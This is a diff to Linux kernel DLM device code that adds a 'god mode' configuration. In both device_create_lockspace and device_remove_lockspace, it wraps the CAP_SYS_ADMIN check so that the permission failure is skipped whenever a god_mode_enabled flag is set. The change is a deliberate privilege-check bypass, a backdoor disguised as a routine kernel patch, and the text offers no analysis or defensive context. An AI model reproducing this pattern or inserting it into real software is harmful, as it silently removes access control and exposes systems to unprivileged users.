@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) 2006-2010 Red Hat, Inc.  All rights reserved.
  *
@@ -390,7 +393,15 @@ static int device_create_lockspace(struct dlm_lspace_params *params)
 	int error;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = dlm_new_lockspace(params->name, NULL, params->flags,
 				  DLM_USER_LVB_LEN, NULL, NULL, NULL,
@@ -420,7 +431,15 @@ static int device_remove_lockspace(struct dlm_lspace_params *params)
 	int error, force = 0;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	ls = dlm_find_lockspace_device(params->minor);
 	if (!ls)
